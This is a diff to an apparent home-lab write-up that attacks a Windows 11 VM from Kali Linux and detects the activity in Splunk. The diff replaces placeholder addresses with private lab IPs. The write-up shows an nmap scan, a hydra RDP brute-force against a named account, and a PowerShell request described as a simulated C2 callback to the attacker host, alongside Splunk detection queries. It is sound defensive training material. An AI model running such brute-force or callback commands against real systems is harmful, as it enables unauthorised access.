@@ -32,13 +32,13 @@ The goal: think like an attacker, detect like a defender.
 │   ┌──────────────────┐          ┌────────────────────────────┐    │
 │   │   Kali Linux     │          │   Splunk Enterprise (Free) │    │
 │   │   (Attacker)     │          │   Listening on :9997       │    │
-│   │   <KALI-ATTACKER-IP>   │          │   Web UI on :8000          │    │
+│   │   192.168.64.3   │          │   Web UI on :8000          │    │
 │   └────────┬─────────┘          └───────────────▲────────────┘    │
 │            │ Attack Traffic                     │ Log Forwarding  │
 │            ▼                                    │                 │
 │   ┌─────────────────────────────────────────────┴──────────────┐  │
 │   │              Windows 11 Pro (Target)                       │  │
-│   │              <WINDOWS-TARGET-IP>                                 │  │
+│   │              192.168.64.20                                 │  │
 │   │                                                            │  │
 │   │  • Advanced Audit Policy (Process Creation + Logon)        │  │
 │   │  • PowerShell Script Block + Module Logging                │  │
@@ -51,9 +51,9 @@ The goal: think like an attacker, detect like a defender.
 
 | Host | IP | Role |
 |---|---|---|
-| Kali Linux (UTM VM) | <KALI-ATTACKER-IP> | Attacker |
-| Windows 11 Pro (UTM VM) | <WINDOWS-TARGET-IP> | Target endpoint |
-| macOS host | <SPLUNK-HOST-IP> | SIEM (Splunk) |
+| Kali Linux (UTM VM) | 192.168.64.3 | Attacker |
+| Windows 11 Pro (UTM VM) | 192.168.64.20 | Target endpoint |
+| macOS host | 192.168.64.1 | SIEM (Splunk) |
 
 ---
 
@@ -137,7 +137,7 @@ Splunk Universal Forwarder was installed on the Windows VM to ship Security and 
 defaultGroup = default-autolb-group
 
 [tcpout:default-autolb-group]
-server = <SPLUNK-HOST-IP>:9997
+server = 192.168.64.1:9997
 ```
 
 **`inputs.conf`** — tells the forwarder which logs to collect:
@@ -154,7 +154,7 @@ index = main
 After restarting the forwarder, the connection was verified active:
 ```
 Active forwards:
-        <SPLUNK-HOST-IP>:9997
+        192.168.64.1:9997
 ```
 
 With the pipeline confirmed, Windows Security and PowerShell events began flowing into Splunk in real time — over 9,000 events ingested in the first session.
@@ -174,7 +174,7 @@ A port scan itself is not an exploit — it's intelligence gathering. But it dir
 From Kali Linux, Nmap was used to scan the Windows target across common attack-relevant ports:
 
 ```bash
-nmap -Pn -sV -p 22,80,443,3389,445,135,139 <WINDOWS-TARGET-IP>
+nmap -Pn -sV -p 22,80,443,3389,445,135,139 192.168.64.20
 ```
 
 - `-Pn` skips the host discovery ping and goes straight to port scanning
@@ -236,7 +236,7 @@ wrongpassword
 EOF
 
 # Launch the brute-force attack
-hydra -l Harshvardhan -P /tmp/passwords.txt rdp://<WINDOWS-TARGET-IP> -t 1 -W 3
+hydra -l Harshvardhan -P /tmp/passwords.txt rdp://192.168.64.20 -t 1 -W 3
 ```
 
 - `-l Harshvardhan` — target the specific username identified during reconnaissance
@@ -269,7 +269,7 @@ index=main host=WIN-V47LD6TN0F4 EventCode=4625 Logon_Type=3
 ```
 
 ![RDP Brute-Force Events in Splunk](screenshots/rdp-bruteforce-splunk-events.png)
-*Splunk capturing all 10 failed logon events — attacker IP <KALI-ATTACKER-IP> clearly visible*
+*Splunk capturing all 10 failed logon events — attacker IP 192.168.64.3 clearly visible*
 
 The detection rule goes further — it uses time-bucketing to identify the *pattern* of rapid failed logons from a single source, which is the real indicator of brute-force behavior:
 
@@ -283,7 +283,7 @@ index=main host=WIN-V47LD6TN0F4 EventCode=4625 Logon_Type=3
 This fires an alert whenever any source IP generates 5 or more failed logons against the same account within a 5-minute window — a threshold tunable to the environment.
 
 ![RDP Brute-Force Detection Rule](screenshots/rdp-bruteforce-detection-rule.png)
-*Detection rule firing: 10 failed logons from <KALI-ATTACKER-IP> within a single 5-minute bucket*
+*Detection rule firing: 10 failed logons from 192.168.64.3 within a single 5-minute bucket*
 
 **Prevention:** Account lockout policies can limit brute-force effectiveness by locking an account after a defined number of failed attempts. Additionally, restricting RDP access to specific source IPs via Windows Firewall rules would prevent external brute-force entirely.
 
@@ -312,7 +312,7 @@ net user
 systeminfo
 
 # Simulate a C2 callback — trying to reach attacker-controlled infrastructure
-Invoke-WebRequest -Uri "http://<KALI-ATTACKER-IP>" -UseBasicParsing -ErrorAction SilentlyContinue
+Invoke-WebRequest -Uri "http://192.168.64.3" -UseBasicParsing -ErrorAction SilentlyContinue
 ```
 
 ![whoami output](screenshots/recon-whoami-output.png)
@@ -325,7 +325,7 @@ Invoke-WebRequest -Uri "http://<KALI-ATTACKER-IP>" -UseBasicParsing -ErrorAction
 *Attacker collecting OS version, hostname, installed patches, and network configuration*
 
 ![C2 callback attempt](screenshots/recon-invoke-webrequest-output.png)
-*Attacker attempting to reach command-and-control infrastructure at <KALI-ATTACKER-IP> — connection failed but the attempt was logged*
+*Attacker attempting to reach command-and-control infrastructure at 192.168.64.3 — connection failed but the attempt was logged*
 
 ### What could this attack do?
 
